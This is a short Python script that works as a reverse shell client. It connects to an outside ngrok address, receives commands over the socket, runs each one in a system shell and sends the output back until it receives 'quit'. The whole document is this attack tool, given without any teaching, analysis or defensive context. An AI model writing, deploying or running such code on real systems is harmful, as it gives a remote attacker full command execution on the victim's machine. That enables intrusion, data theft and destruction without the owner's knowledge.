import socket
import subprocess
import os

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

s.connect(("6.tcp.ngrok.io", 19078))

while True:

    # receive the command and print it
    cmd = s.recv(1024).decode()
    print(f'[*] receive {cmd}')

    # check if you want to quit
    if cmd.lower() == 'quit':
        break

    # now run the command and get the result.
    try:
        result = subprocess.check_output(cmd, stderr=subprocess.STDOUT, shell=True)
    except Exception as e:
        result = str(e).encode()

    # if the command has no output, send 'ok' so the server knows everything is okay
    if len(result) == 0:
        result = 'OK'.encode()

    # send teh result to the server
    s.send(result)

s.close()